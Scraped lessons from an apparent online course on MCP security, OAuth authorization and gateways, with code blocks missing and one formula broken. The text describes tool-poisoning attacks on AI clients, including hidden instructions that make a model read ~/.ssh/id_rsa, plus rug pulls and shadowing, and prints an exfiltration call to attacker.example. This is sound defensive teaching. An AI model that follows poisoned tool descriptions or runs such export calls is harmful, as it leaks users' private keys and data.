Had a model obeyed, read_file('~/.ssh/id_rsa') and the traversal '/home/user/notes/../.ssh/id_rsa' would both be blocked by the host's allowlist, while a legitimate note path is allowed. That check holds whatever the model does. Idea 10 · Reduce authority before execution Statelessness alone is not safety. It removes hidden protocol history, but a self-contained request can still ask an overpowered handler to leak data or make an irreversible change. Safety comes from reducing authority at each boundary: Typed verb. Expose one bounded operation such as archive_note , not a generic run or request tool that can express unrelated powers. Validated arguments. Use a closed schema where practical, reject unknown fields, normalize identifiers once, cap sizes, and validate destination, tenant, and resource ownership before policy evaluation. Current authorization. Bind the authenticated principal to the exact verb, resource, environment, and normalized arguments. Tool annotations and client capabilities do not grant this authority. Action-bound approval. For a consequential call, bind approval to a digest of the typed verb and normalized arguments, plus principal, expiry, and one-time policy. Any changed field requires a new decision. First-class refusal. Model deny, expired approval, user decline, and unsafe destination as ordinary outcomes that execute no side effect. Do not translate refusal into a weaker fallback tool. Redacted audit evidence. Record who asked, which admitted descriptor and policy version were used, what normalized target was authorized, why the decision allowed or refused, and whether execution began. Store digests or redacted values instead of secrets. Each step narrows what the next component may do. The final handler should receive an already validated domain command, not raw model text plus broad credentials. Repeat the entire chain on an MRTR retry, task update, or gateway-forwarded call. An earlier approval does not turn later requests into trusted session traffic. Idea 11 · Current and legacy interaction paths Roots, Sampling, and Logging are deprecated for new 2026-07-28 implementations. A gateway may retain older request-channel code only as a version-gated compatibility path. Do not build a new defense around a per-session sampling limiter. Apply quotas to authenticated principal, issuer, resource, tool, and time window. For current interactive work, inspect MRTR input requests and responses. Idea 12 · Stateless transport checks Accept modern MCP messages at the single POST endpoint. Return 405 for modern GET and DELETE. Do not mint or depend on Mcp-Session-Id . Ignore legacy session and replay headers as authority inputs. Return JSON or request-scoped SSE for that POST. Use subscriptions/listen only for opted-in long-lived change notifications. Build it code/main.py implements a small in-process security gateway model. It canonicalizes and pins full tool descriptors, reports metadata poisoning and shadowing, validates the modern request envelope and routing values, and performs a two-round confirmed export with signed requestState and an injected shared replay store. The model starts after an HTTP adapter has parsed the JSON body and routing headers. It does not validate Content-Type or Accept . Connect the same dispatcher to Lesson 13.9 's complete Streamable HTTP adapter, which requires Content-Type: application/json and an Accept value containing both application/json and text/event-stream . Run it: Copy The sample intentionally mutates a descriptor. The scanner and digest comparison produce independent findings. The export then demonstrates the input_required response and stateless retry. Use it: the same idea with real libraries Replace SAFE_TOOLS with a normalized snapshot from your own approved servers. Keep credentials and secrets out of the snapshot. Review every new or changed descriptor before updating its digest. At a gateway, run the same checks during discovery and again before dispatch. A cache can reduce discovery work, but a cached approval must expire or be invalidated when the descriptor changes. Break it on purpose A gateway approves tools by name only ( weather.search approved = allowed forever), keys confirmations and rate limits by Mcp-Session-Id , and lets the user's "yes" to "export notes to archive?" be reused for any later export. Show three attacks this allows. (Solution B1.) Industry practice What's current (2024–2026) Tool poisoning is a documented, practical attack : researchers demonstrated it against MCP clients in 2025 (hidden instructions in descriptions, rug pulls, cross-server shadowing), and the MCP specification's security guidance tells clients to treat descriptions and annotations as untrusted. Scanners and gateways : MCP security scanners check descriptions for injection patterns at install time and in CI; gateways pin descriptors, namespace tools and re-verify after updates (Lesson 13.17). Host-side enforcement : confirmation for consequential tools, sandboxed execution, path and domain allowlists, and per-principal rate limits; the 2026-07-28 removal of sessions means none of these may hang off a session id. Design heuristics : Meta's Agents Rule of Two (untrusted input, sensitive data, consequential action: at most two at once) and least-privilege, typed tools instead of generic "run" tools. Sources: MCP security best practices , Invariant Labs: tool poisoning attacks , Meta: Agents Rule of Two , MCP 2026-07-28 changelog . Recap What to keep from this lesson Descriptions, annotations and self-reported identities are untrusted input. Pin the whole canonical descriptor; quarantine new or changed tools until reviewed. Scan as a tripwire, namespace before merging, authorise the principal on every call. Bind confirmations to exact arguments, principal, expiry and a one-time nonce. Enforce limits in the host; never rely on the model ignoring an injection. Solutions Solution P1 · Blocked, quarantined, and the small model ignored it With the scanner on, the updated weather tool is blocked: the scanner flags <IMPORTANT> , ~/.ssh , id_rsa and "Do not mention". With pins only, it is quarantined, because its digest no longer matches the one approved on day 1. The 0.5B model did not follow the poisoned description on any of the six questions. That is a property of a weak model, not a safety guarantee: the host policy in the same run blocks the dangerous read_file calls whatever the model decides. Solution B1 · Rug pull, session games, replayed consent Rug pull through a trusted name. Approval keyed by name lets the server change the description, schema or annotations after approval (to add hidden instructions or a new destination argument) and keep the approval. Pin the full canonical descriptor and re-review on any change. Session games. In 2026-07-28 there is no protocol session: Mcp-Session-Id is client-supplied noise. An attacker sends each request with a fresh or missing id, resetting rate limits and confirmation state at will, or reuses another user's id. Key limits and approvals to the authenticated principal (and tenant, tool, time window). Replayed consent. A "yes" to "export notes to archive" that is reusable for any later export lets a poisoned tool or an injected instruction trigger export(query="*", destination="https://attacker.example") without asking. Bind every confirmation to the exact tool and normalised arguments, the principal, an expiry and a one-time nonce claimed in shared storage; any changed field needs a new decision. Interview questions Open all answers Try answering out loud first, then open one answer at a time. Questions from real AI engineering interviews that this lesson prepares you for. Answer out loud first, then open the worked answer. Debug a failure Your gateway pins each approved tool by hashing its description text. A connected server ships an update. The description is unchanged, but the inputSchema gains a destination field and destructiveHint flips to false. The pin passes, and the model begins calling the tool with the new argument. What went wrong, and how do you pin correctly? Level 2 of 4 · about 9 minutes to answer well. Short answer. The pin covered one field, so a schema and annotation change passed as unchanged. Canonicalize the complete descriptor with sorted keys, hash it, and store the digest under a qualified name together with publisher evidence and the approval time. On every refresh, quarantine an unknown key or a changed digest until a person re-approves it. Hash equality proves stability, not safety, so the first descriptor needs review too. Pin the whole descriptor. Copy Store the digest under a qualified key such as notes.export . On every refresh: Observation Action unknown key quarantine until review same key, different digest quarantine as a rug pull until re-approved duplicate unqualified name require deterministic namespacing scanner hit block and review the complete descriptor Seven surfaces, not one. Metadata poisoning, the descriptor rug pull, cross-server shadowing, header and body confusion, capability escalation, MRTR state tampering, and supply-chain identity confusion overlap. Hash pinning helps with changes but does not prove the first version was safe. A static scanner catches obvious phrases and misses subtle ones. Namespacing prevents one collision class and not a malicious namespaced server. Stack the controls. The scanner is a tripwire. Simple patterns flag role tags, instruction overrides, concealment, secret access and obscured network destinations. They are cheap at install time and in CI. They are not a semantic proof: a safe description can contain a flagged phrase in a warning, and a malicious one can avoid every phrase. Treat a hit as review evidence. Namespace before you merge. When two servers both expose search , never let discovery order decide. The qualified names notes.search and issues.search become the public gateway names, and the backend mapping is recorded separately. Stable names make approval, audit, pins and Mcp-Name routing refer to the same object. Run the checks twice. Run the pin comparison at discovery and again before dispatch. A cache can reduce discovery work, but a cached approval must expire or be invalidated when the descriptor changes. Plausible wrong answers. "Hash the description; the schema is only typing." The schema decides which arguments the model can send, and a new field can route data to a new destination. "A matching hash means the tool is safe." It means the descriptor did not change. A poisoned descriptor stays poisoned when pinned. "Set destructiveHint and the host will confirm." Annotations are untrusted hints. The server enforces authorization and approval. Follow-ups an interviewer may ask. (level 2) What does a clean scanner result prove? Expected: nothing semantic; it is review evidence, not an innocence score. (level 3) The server's serverInfo says it is the familiar publisher. How much trust does that buy? Expected: none; it is self-reported display data for logs, not a certificate or registry proof. (level 3) The descriptor was poisoned on day one and the pin stored that digest. What catches it? Expected: review before the first approval, with the scanner as a tripwire; the hash cannot. (level 4) How does a gateway stop the model from treating annotations as policy? Expected: annotations stay presentation hints; authorization binds the principal to the exact verb, resource and normalized arguments, and a consequential call needs action-bound approval. It takes the tools/list results of several servers and produces an admitted set, a rejected set and an audit trail. Describe your design, the tests you ship, and the evidence a reviewer should expect. Level 4 of 4 · about 60 minutes to answer well. Short answer. Run the five gates in order and keep them separate. Discover with an opaque cursor loop that stops only when nextCursor is absent or null ; admit each descriptor against a canonical whole-descriptor digest, a full schema-tree walk for x-mcp-header , and a sensitive-name policy; qualify every tool as <server>.<tool> before the merge; and validate structuredContent against the published output schema before anything reaches the model. Tests prove that one rejected descriptor does not block valid tools, that an empty-string cursor continues, that an annotation under oneOf , items or $ref is rejected, and that a changed inputSchema fails the pin. The evidence is the page trace, the admitted and rejected sets, the digest ledger and redacted audit events. Modules. Canonicalize the descriptor with sorted keys and compact separators, hash it, and store the digest under the qualified name with publisher evidence and approval time. An unknown key is quarantined. Walk the entire inputSchema tree. x-mcp-header is legal only on a direct member of inputSchema.properties , with type string, integer or boolean, a non-empty token header name unique without regard to case, and integer values inside the JavaScript safe range. Reject it under a nested object, a oneOf branch, items , a $ref target or any output schema. Run the static scanner for role tags, instruction overrides, concealment, secret access and obscured destinations. Treat a hit as review evidence, not as a verdict. A descriptor without an input schema object is rejected; a tool with no arguments declares {"type": "object", "additionalProperties": false} . Store the verified publisher namespace and the live server/discover identity with the approved record. On a later refresh, quarantine a server whose namespace or live identity differs, even when every descriptor digest still matches. Namespacing and merge. Qualified names are the public gateway names. Record the backend mapping separately. Sort before merging so local order does not depend on process timing. Never let discovery order decide a collision. The invoke path. Validate arguments before the call. Encode mirrored header values as plain visible ASCII or the exact base64 UTF-8 sentinel. Validate structuredContent as any JSON value against the output schema, including results with isError: true . Audit the header name and the encoding decision, never the value. Tests to ship. A two-page list whose first page returns "" as the cursor produces two requests. One unsafe descriptor is rejected and every valid descriptor on the same server is admitted. An annotation under oneOf , items , a nested properties or a $ref definition is rejected even when that branch is never used. Changing inputSchema without changing the description fails the pin. An unchanged descriptor behind a changed server/discover identity is quarantined. Two servers that both expose search become two qualified names and two digests. Do not claim gateway compatibility from a successful tools/call alone. Plausible wrong answers. "Hash the description; schemas rarely change." Code in : Python, TypeScript. The Python runs on this page; the other languages are shown for comparison. In plain words first The idea in one line A remote MCP request is stateless, but its authorization is not anonymous. Bind every credential to the issuer that created it and every token to the resource that receives it. Terms you'll hear Term Meaning Protected-resource metadata RFC 9728 document that identifies the resource and authorization servers CIMD HTTPS metadata document whose URL is the OAuth client identifier DCR Deprecated dynamic client enrollment retained for compatibility application_type native or web , used to validate redirect URI rules PKCE Verifier and S256 challenge that protect an intercepted authorization code iss RFC 9207 authorization response issuer identifier Resource indicator RFC 8707 parameter that binds a token request to an MCP resource Audience Resource for which a token is valid Step-up New consent and token issuance for an additional current-operation scope Issuer-bound credentials Registration and token records isolated by exact authorization server issuer The problem In plain words first A remote MCP server that can read private notes must know who is calling and what they agreed to. MCP uses OAuth for this. The user signs in at an authorization server, which gives the client an access token. The client then sends that token with every request to the MCP server, and the server checks it. Several details make this safe. PKCE ties the sign-in to the client that started it, so a stolen code is useless. The iss check makes sure the answer came from the expected authorization server. The audience check makes sure a token meant for one server cannot be used at another. Scopes limit what the token allows. The 2026-07-28 revision also prefers Client ID Metadata Documents (a URL that identifies the client) over dynamic registration. This lesson runs the sign-in flow with real signed tokens and three attacks. It then puts the official SDK's protected MCP endpoint in front of five different tokens. A remote MCP server may read private records, write external systems, or trigger costly work. Authentication tells it who presented a credential. Authorization must also answer: Which authorization server issued the credential? Which MCP resource is the token for? Which client and redirect URI completed the flow? Which operations did the user approve? Does this exact request still fit that approval? The 2026-07-28 authorization profile hardens client enrollment and issuer handling. It prefers Client ID Metadata Documents, deprecates Dynamic Client Registration, requires the right application_type on DCR, validates RFC 9207 issuer responses, and forbids credential reuse across issuers. These rules complement the stateless core. They do not restore a core handshake or Mcp-Session-Id . Idea 1 · Know the three roles MCP client: sends requests on behalf of a resource owner. MCP resource server: accepts the access token and serves the MCP endpoint. Authorization server: authenticates the resource owner, collects consent, and issues tokens. The resource server and authorization server can be operated together, but keep their identifiers and validation responsibilities separate. Idea 2 · Authorization applies to HTTP The MCP authorization specification applies to HTTP-based transports. A local stdio server runs under the process and operating-system trust boundary. Do not add a fake browser OAuth flow to stdio merely for symmetry. For remote Streamable HTTP, send the bearer token in the Authorization header on every request. Never place it in the URL. Idea 3 · Start with protected-resource metadata The resource server publishes RFC 9728 metadata: Copy The client starts from the MCP resource URL, fetches this document, selects an advertised authorization server, and then fetches that server's OAuth or OpenID Connect metadata. Preserve the resource path when constructing the RFC 9728 well-known URL. For the resource https://notes.example.com/mcp , this lesson uses https://notes.example.com/.well-known/oauth-protected-resource/mcp . Dropping the /mcp suffix can select metadata for a different protected resource on the same origin. Do not guess the authorization server from a hostname. Do not follow an issuer discovered from an unvalidated error body. Keep a policy for which issuers the client is willing to trust. Idea 4 · Verify authorization server metadata The metadata should expose endpoints and supported controls: Copy Require S256 for PKCE. Record the exact issuer string. That exact value becomes the key for registration and token storage. Idea 5 · Follow the registration priority Use pre-registered client information when the client already has an explicit relationship with the selected issuer. Otherwise prefer Client ID Metadata Documents when the authorization server advertises support. Use DCR only as the deprecated compatibility fallback, then prompt for client information if none of those mechanisms is available. Idea 6 · Prefer Client ID Metadata Documents A Client ID Metadata Document gives the authorization server an HTTPS URL that is both the client identifier and the location of its metadata: Copy The authorization server fetches and validates the document. The client_id must be an HTTPS URL with a path, and the value inside the document must equal that URL exactly. The required document fields are client_id , client_name , and redirect_uris . application_type appears in this example but is not a CIMD requirement. Its new mandatory use is specifically the DCR path. Treat fetching the document as an SSRF-sensitive operation. Resolve and validate the destination, reject loopback, private, link-local, and otherwise disallowed addresses, re-check after redirects and DNS changes, limit redirects, bytes, and time, require JSON, and cache only according to validated HTTP cache controls. Treat client_name and other display fields as untrusted text. CIMD removes the need to mint a fresh dynamic identifier for every first contact. It does not remove redirect URI validation, issuer policy, or user consent. Idea 7 · DCR is a compatibility path Dynamic Client Registration remains available for older authorization servers, but it is deprecated for new MCP implementations. When using DCR, declare application_type : Copy Desktop, mobile, command-line, and loopback clients use native . Remotely hosted browser applications use web and remote HTTPS redirects. Omitting the field can default to web in an OpenID Connect registration implementation and make a legitimate loopback redirect fail. Keep DCR code behind an explicit fallback decision. Do not silently fall back after an arbitrary CIMD validation failure. That could turn a security failure into a weaker enrollment path. Idea 8 · Bind credentials to the issuer Store issuer-minted enrollment material under the exact issuer: Copy If protected-resource discovery changes from https://auth-one.example to https://auth-two.example , re-evaluate trust. Never send the first issuer's client secret, DCR client id, registration access token, refresh token, or access token to the second. Pre-registered and DCR clients must use credentials issued for the new issuer. A CIMD client id is different because it is a self-hosted HTTPS URL, not a credential minted by an authorization server. The same CIMD URL is portable: a new trusted issuer fetches and validates the document without DCR re-registration. Authorization responses and tokens are still validated and stored under the new issuer. Idea 9 · Authorization code with PKCE The interactive flow is: Generate a high-entropy code_verifier . Derive the S256 code_challenge . Send the authorization request with exact client_id , redirect_uri , scope , code_challenge , and resource . Receive an authorization response containing code and, when provided, iss . Validate iss against the exact recorded issuer before using any response field. Exchange the code with code_verifier , the same redirect URI, and the same resource . Store the resulting token under (issuer, resource) . The resource parameter from RFC 8707 appears in both authorization and token requests. It identifies the canonical MCP server URI. Idea 10 · Validate iss exactly RFC 9207 prevents an authorization response from one issuer being confused with a response from another. When iss is present, compare it to the recorded issuer without case folding, trailing-slash changes, default-port removal, or percent-encoding normalization. On mismatch, do not act on the code or even display attacker-controlled error details from that response. An authorization server that includes iss advertises authorization_response_iss_parameter_supported: true . Current clients still validate a present iss even when that advertisement is missing. Idea 11 · Validate audience at the MCP server The resource server accepts only tokens issued for itself: Copy Invalid, expired, wrong-issuer, or wrong-audience tokens receive 401. The MCP server must not accept or transit a token meant for another service. The same idea as a formula PKCE (S256). The client picks a random verifier (43–128 characters) and sends only with the authorization request. The token request must present ; the server recomputes . A thief who intercepts the code but not would have to find with ) = SHA256 ( v ) : infeasible. A random 64-character URL-safe verifier carries about bits of entropy. What the MCP server accepts. A token is accepted for a request needing scopes only if ​ ( t ) ∧ t . iss = I ∧ t . aud = R ∧ now < t . exp ∧ Q ⊆ t . scope , with the configured issuer and the server's canonical resource URI. Failures of the first four give HTTP 401; a valid token with too few scopes gives 403 insufficient_scope , which tells the client what to ask for (step-up). Worked example One sign-in and five tokens Normal flow: verifier → challenge → code → token. The token says iss = https://auth.example.com , aud = https://notes.example.com/mcp , scope = notes:read , valid 600 s. Stolen code, wrong verifier: the challenge does not match → invalid_grant . Replaying the same code: codes are single-use → invalid_grant . Mix-up: the authorization response says iss = https://evil-as.example → the client stops before redeeming anything. At the MCP server: a token for calendar.example.com (wrong audience), an expired token and a token from another issuer → 401. A valid token with only notes:write → 403, "Required scope: notes:read". Check your mental model ✗ "PKCE is only for public clients without secrets." ✓ OAuth 2.1 and MCP require it for every authorization-code flow. ✗ "Any valid token from our authorization server works on any of our MCP servers." ✓ Each server accepts only tokens whose audience is its own resource URI. ✗ "A gateway can forward the user's token to the backend services it calls." ✓ No token passthrough: each hop gets its own token for its own audience. ✗ "Stdio servers need OAuth too." ✓ MCP authorization applies to HTTP; a local stdio server runs inside the OS trust boundary. Predict before you run An attacker intercepts the authorization code but not the client's PKCE verifier and tries to redeem it. Then the real client redeems the same code twice. Then an authorization response claims to come from a different issuer. Which of these yields a token? (Solution P1.) See it drawn Authorization code with PKCE, iss checking, and three attacks A toy authorization server with the real checks: single-use codes bound to client, redirect URI and resource; S256 PKCE; RS256-signed JWT access tokens (PyJWT and cryptography ) with issuer, audience, subject, scope and expiry; and an iss in every authorization response (RFC 9207). The client uses a Client ID Metadata Document URL as its client id. Instant. Copy What you should see Copy Copy Reading this output The normal flow yields a narrow token. It names its issuer, its audience ( https://notes.example.com/mcp ), its subject, the single scope notes:read , and a 600-second lifetime. Nothing in it would let it be used at another server. A stolen code is useless without the verifier. The attacker's token request fails with "PKCE verifier does not match the challenge": the authorization server only ever saw the SHA-256 of the real verifier. Codes are single-use. Redeeming the same code a second time fails ("unknown or reused code"), even for the legitimate client. A server should also revoke tokens already issued from a code that is replayed. Mix-up is stopped by the client. When the authorization response names a different issuer than the one the client started with, the client refuses before sending the code anywhere. Idea 12 · Request the smallest current scope Start with the scope needed now. If a later tool requires more, the server returns 403 with an authoritative scope challenge: Copy The client explains the new permission, obtains consent, performs a new authorization flow with the combined scope set, and retries the MCP request with a new JSON-RPC id. Do not assume the challenged scope is a subset of scopes_supported . The challenge is authoritative for the current operation. Idea 13 · Authorization and the stateless MCP wire An authorized tool call still carries the complete current request envelope: Copy Copy The token authorizes the principal. The request metadata negotiates protocol behavior. Neither substitutes for the other. Validate the wire in a fixed order: JSON-RPC and metadata types, header and body equality, then protocol support. A routing or version-header mismatch returns HTTP 400 with -32020 . If header and body agree on an unsupported version, return HTTP 400 with -32022 and data exactly {"supported":["2026-07-28"],"requested":"<actual>"} . An unknown method returns HTTP 404 with -32601 . Every request error, including 401 invalid token and 403 insufficient scope, is a JSON-RPC error envelope with the original request id . Structured recovery information belongs in optional error data ; WWW-Authenticate remains an HTTP response header. A notification has no id , so it receives no JSON-RPC body. An accepted HTTP notification returns 202 with an empty body. The server implements server/discover and advertises tools, so it also implements the mandatory tools/list method. Its tool descriptors have stable names, descriptions, and object-root inputSchema values. The list is deterministic and returns resultType , server identity metadata, a bounded ttlMs , and cacheScope . Discovery and a user-independent tool list can be available before authorization. Apply normal policy and private caching if either varies by principal. Idea 14 · No token passthrough An MCP server must not forward the client's MCP access token to a downstream API. Obtain a separate downstream token with the right audience or use an explicit token-exchange design. Audience validation only works when services refuse tokens minted for someone else. Idea 15 · Refresh tokens Refresh tokens are optional. When issued, store them confidentially and key them by issuer and resource. Do not assume they exist. Rotate them when the authorization server supports rotation and detect reuse of invalidated values. Build it code/main.py is an in-process protocol and authorization simulator. Break it on purpose A gateway accepts the user's token for https://gateway.example.com/mcp and forwards the same token to three backend MCP servers, which only check the signature and expiry. What can go wrong, and what should each hop do instead? (Solution B1.) Industry practice What's current (2024–2026) MCP authorization in 2026-07-28 : OAuth 2.1 with PKCE, RFC 9728 protected-resource metadata, RFC 8707 resource indicators, RFC 9207 iss validation (clients must check a present iss ), Client ID Metadata Documents preferred, Dynamic Client Registration deprecated (with application_type required when used), credentials bound to their issuer. Add a second resource under the same issuer. Confirm its access token cannot be used at the first resource. Solutions Solution P1 · None of them None of them. The stolen code fails PKCE (the attacker cannot produce the verifier whose hash the server stored), the second redemption fails because codes are single-use, and the mix-up response is refused by the client itself because its iss does not equal the issuer the client started with. Only the first, normal redemption produced a token. Solution B1 · One token, four doors The backends accept a token that was never meant for them. Because they check only signature and expiry, the user's gateway token works at all three, so a compromised or buggy gateway, or anyone who steals that one token, can call every backend directly with the user's full rights. The audit logs show the user, not the gateway, and the backends cannot tell which client actually acted. It also violates the consent the user gave: they approved access to the gateway's resource, not to three other servers. What each hop should do: Each backend validates audience : accept only tokens whose aud (resource) is its own canonical URI, plus issuer, expiry and scope. The gateway gets its own tokens : for each backend, obtain a token with that backend as the audience, by token exchange (RFC 8693) or the gateway's own client credentials with delegated scopes, and never forward the inbound token. Scopes shrink at each hop to what that backend call needs. Interview questions Open all answers Try answering out loud first, then open one answer at a time. Defend a design You deploy a remote MCP server that accepts tokens from two authorization servers, one for staff and one for partners. Design the client enrollment, the per-request token validation and the key handling so that three things hold: a token minted for a sibling MCP server is refused, a signing key rotation causes no outage, and a client steered to a hostile token endpoint never hands over its authorization code. Level 4 of 4 · about 15 minutes to answer well. Short answer. Publish RFC 9728 protected-resource metadata that names both issuers, and treat that list as the issuer allow-list. Enroll a client with its pre-registered credentials when it has an explicit relationship with that issuer, otherwise with a Client ID Metadata Document when the issuer advertises support, and use deprecated dynamic registration only as an explicit fallback with the correct application_type . On every request validate the pinned iss , an aud equal to this server's canonical resource URI, exp and the scope the tool needs; answer 401 for an invalid token and 403 with insufficient_scope for a valid token that lacks the scope. Refresh the JWKS on a schedule and re-fetch once on an unknown kid , and let the client record the issuer before it redirects and compare the RFC 9207 iss in the authorization response exactly before it redeems the code. Discovery and the deployment gate. The client starts from the MCP resource URL, fetches the RFC 9728 document, selects an advertised authorization server and fetches its RFC 8414 metadata. Keep the resource path when you build the well-known URL: a resource served at the path /mcp resolves to /.well-known/oauth-protected-resource/mcp on the same host. Before trusting an issuer, check the metadata mechanically: S256 must be advertised or you stop, response_types_supported is ["code"] , and at least one enrollment path exists. Enrollment priority. Path When Note pre-registered client an explicit relationship with that issuer exists credentials keyed by issuer Client ID Metadata Document the issuer advertises support the HTTPS URL with a path is the client_id and the document's client_id equals it dynamic registration neither of the above deprecated; declare native or web ; never a silent fallback after a CIMD failure Fetching a CIMD is an SSRF-sensitive operation for the issuer. Store issuer-minted credentials under the exact issuer and access tokens under (issuer, resource) . If discovery moves from one issuer to another, re-evaluate trust and never send the first issuer's secret, registration token or tokens to the second. A CIMD URL is portable because it is self-hosted, not minted. Validation on every request. Copy A missing aud is a rejection, never a wildcard. The replay walkthrough: a token for notes.example.com presented to tasks.example.com passes the issuer check and fails the audience check, and the server returns 401 with WWW-Authenticate: Bearer error="invalid_token" and a resource_metadata pointer. The spec calls this access-token privilege restriction. Never forward the inbound token to a downstream API; obtain a separate downstream token. Rotate at the issuer, refresh at the server. The issuer rotates by publishing the next key before retiring the previous one, so two keys at once is the steady state. The resource server only refreshes: a scheduled job overwrites cache[issuer] = {keys, fetched_at} , and a token with an unknown kid triggers one synchronous re-fetch and then fails if the key is still missing. Never wire the cache miss to rotate-and-mint: the new key still does not match, and attacker-chosen kid values become a key-creation denial of service. The mix-up defense lives in the client. A hostile authorization server can steer a client to redeem an honest issuer's code at the attacker's token endpoint. PKCE does not stop it, because the client hands its code_verifier to whatever endpoint it was steered to. The client records the expected issuer before redirecting and compares the returned iss as a plain string, with no case folding, slash or port normalization, before it sends the code anywhere. Declared failure policy. Failure Behavior scheduled JWKS refresh fails, known kid still cached continue only within a declared stale-on-error window unknown kid and the one refresh fails reject introspection unavailable for an opaque token fail closed; never convert a network error into active: true issuer metadata changes unexpectedly stop new enrollment and token acquisition Plausible wrong answers. "Any token from our own identity provider is fine." A token minted for a sibling server passes the issuer check; only the audience check refuses it. "Fetch the JWKS once at boot." The validator rejects every token after the next rotation until a restart; refresh on a schedule and once on a miss. "Fall back to dynamic registration when CIMD validation fails." A security failure must not select a weaker enrollment path; the fallback is an explicit configuration decision. Follow-ups an interviewer may ask. (level 3) Why is a per-connection token check not enough? Expected: there is no protocol session; every request carries its own bearer token and is validated on its own. (level 3) A scope step-up is needed for one tool. What does the server return? Expected: 403 with WWW-Authenticate: Bearer error="insufficient_scope" naming the scope and the resource_metadata URL; the client obtains consent and retries with a new request id. (level 4) Two concurrent step-ups produce two tokens with different scopes. Which does the validator use? Expected: the token presented on the request, never a lookup of "the user's current scope", which would open a time-of-check race. (level 4) The partner issuer changes its issuer URL in discovery. What may the client reuse? Expected: only a portable CIMD URL; prior issuer-minted credentials, registration tokens and access tokens are refused, and the client re-enrolls. Where it is taught. The OAuth lesson builds the enrollment and the flow, and the production auth lesson adds JWKS refresh, audience replay and the failure table. a1317: Course home / Phase 13 · Tools & Protocols Stateless MCP Gateways and Registry Admission Lesson 13.17 75 min Learn Completed Lesson goals What you will be able to do Aggregate several MCP servers behind one 2026-07-28 endpoint without session affinity. Validate per-request metadata and routing headers before policy or forwarding. Merge tools with stable namespaces, deterministic order, descriptor pins, RBAC, and private caching. Treat registry records as discovery evidence that still requires admission policy. Route request-scoped SSE, subscriptions/listen , MRTR retries, and Tasks extension calls correctly. Isolate legacy handshake and session support from the modern path. Before you start Needs : Phase 13 · 15 (security), Phase 13 · 16 (authorization) Type : Learn. Time : about 75 minutes. Code in : Python, TypeScript. The Python runs on this page; the other languages are shown for comparison. In plain words first The idea in one line A gateway should make every route explicit. The 2026-07-28 protocol gives it method, name, version, capability, identity, cache, and trace boundaries without a transport session. Terms you'll hear Term Meaning MCP gateway Policy and routing server between clients and backend MCP servers Admission record Evidence and policy decision allowing one backend into the gateway Qualified tool name Stable public route such as notes.search Descriptor pin Approved digest checked during discovery and dispatch Private cache scope Cached result restricted to one authorization context Request-scoped SSE Streaming response attached to one POST request subscriptions/listen Client-opened SSE stream for selected long-lived change notifications Task route Application mapping from an opaque task id to its backend Legacy adapter Explicit version-gated boundary for old handshake and session behavior The problem In plain words first When a company runs many MCP servers, it rarely lets every client connect to each one. It puts a gateway in front. The gateway is one MCP endpoint that checks who is calling, decides which tools that person may see and call, gives each tool a stable public name such as notes.search , and forwards approved calls to the right backend server. It also checks that a backend's tool descriptions have not changed since someone reviewed them, limits how often each caller can call, and writes an audit record of every decision. The 2026-07-28 protocol makes this easier, because every request carries everything needed to handle it, so any gateway machine can serve any request. Public registries help the gateway find servers, but appearing in a registry is not approval. This lesson builds a working gateway over two SDK servers, then applies an admission policy to registry records. Connecting one client directly to one server is simple. A larger deployment needs a consistent answer to harder questions: Which servers are allowed? Which principal can see and call each tool? What happens when two backends expose the same name? How are descriptor changes reviewed? Where are rate limits and audit events applied? Can any instance handle the next request? A gateway sits between clients and backend MCP servers. It presents one MCP endpoint, applies cross-cutting policy, and forwards approved requests. Older gateway designs often multiplexed one client session into several backend sessions and rewrote Mcp-Session-Id . That is a legacy compatibility design. The 2026-07-28 core has no protocol sessions. Idea 1 · The modern gateway path For each request: Authenticate the principal from transport authorization. Validate MCP-Protocol-Version , Mcp-Method , Mcp-Name , and params._meta . Authorize the principal, resource, method, tool, and arguments. Apply descriptor, registry, rate, and data policy. Create a fresh self-contained request for the selected backend. Validate the backend result and return a gateway result. Record an audit event without logging secrets. No step needs a hidden protocol session. Application state can still exist in databases, explicit handles, Tasks, or integrity-protected MRTR state. Idea 2 · Runtime policy is the primary gateway decision Admission decides which backend version may enter the gateway. It does not authorize a live call. For every request, the gateway recomputes policy from the authenticated principal, issuer and resource, tenant, matched method and name, normalized arguments, admitted descriptor pin, current backend health, capability intersection, data classification, rate state, and any action-bound approval. This ordering matters. A Registry record can remain active while a user's role is revoked. A descriptor can remain pinned while a destination argument crosses a tenant boundary. A backend can remain approved while incident policy quarantines state-changing calls. Runtime policy is therefore the primary allow or deny decision, with Registry and descriptor evidence as inputs. Do not cache an allow decision under a connection or removed session identifier. If policy is unavailable, follow a declared failure policy by operation class. A safe default is to fail closed for state changes and sensitive reads, while explicitly approved public read paths may use a short-lived last-known policy only when their risk model permits it. Record which policy version and failure path made the decision, then validate the backend result before returning it. Idea 3 · One POST endpoint Modern Streamable HTTP sends each JSON-RPC message through POST: Copy The gateway can return JSON or request-scoped SSE for that POST. GET and DELETE return 405 for modern requests. Mcp-Session-Id and Last-Event-ID do not create authority, affinity, or replay behavior. Header and body values must agree. Reject mismatch with -32020 before looking up a backend. This lets load balancers, gateways, and rate limiters route without parsing the full body while preserving end-to-end integrity. Validate in one exact order: JSON-RPC and metadata types, header and body equality, then support for the matched version. A mismatch returns HTTP 400 with -32020 . If header and body agree on an unsupported version, return HTTP 400 with -32022 and data exactly {"supported":["2026-07-28"],"requested":"<actual>"} . An unknown method returns HTTP 404 with -32601 . ProtocolError carries optional data , and the gateway serializes it into the JSON-RPC error object. A notification has no id , so it never receives a JSON-RPC success or error. An accepted HTTP notification returns 202 with an empty body. Idea 4 · Implement discovery at every layer The gateway implements server/discover for clients. It also discovers each backend so it knows protocol versions, capabilities, and extensions. Example gateway result: Copy Advertise only the capability intersection the gateway can honor end to end. A backend feature is not automatically safe to expose. A gateway feature with no backend path is not useful to advertise. serverInfo is self-reported display and diagnostic data. Do not use it as registry or publisher proof. Idea 5 · Per-request client capabilities Every forwarded request needs a current _meta envelope: Copy Do not blindly copy the outer client capabilities to a backend. The gateway is the backend's client. Advertise only features the gateway will mediate correctly. Idea 6 · Deterministic namespacing Merge backend tools under stable public names: Copy Keep a mapping from public name to backend and original tool name. Never choose the first or last collision. A public name is part of the approval and audit contract, so changing it is a migration. tools/list must be deterministic. When visibility differs by principal, return cacheScope: private . A bounded ttlMs reduces backend discovery load without allowing a user-specific list to leak across authorization contexts. Every exposed tool descriptor includes a stable name, description, and object-root inputSchema . Namespacing cannot remove required descriptor fields. The complete list result also includes resultType , server identity metadata, and cache hints. Idea 7 · Pin approved descriptors At admission time, canonicalize the complete descriptor and store its digest under the qualified public name. At list and call time, compare the live descriptor with the approved digest. 